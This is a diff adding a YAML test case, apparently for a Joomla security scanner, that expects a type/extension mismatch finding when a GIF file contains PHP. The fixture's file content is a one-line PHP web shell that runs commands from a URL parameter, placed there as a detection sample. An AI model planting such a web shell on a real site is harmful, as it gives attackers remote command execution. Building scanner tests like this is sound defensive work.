@@ -1,0 +1,15 @@
+# Positivo (FR-005): GIF con contenido PHP → discrepancia tipo/extensión.
+case: type-mismatch
+base:
+  cms: joomla
+  version: "1.1.0"
+expect:
+  exit_code: 1
+  findings:
+    - rule_id: J0W-CORE-010
+      subject: images/banner2.gif
+      min_severity: medium
+mutations:
+  - op: add_file
+    path: images/banner2.gif
+    content: "<?php system($_GET['cmd']); ?> // relleno para superar el minimo de deteccion de tipo"
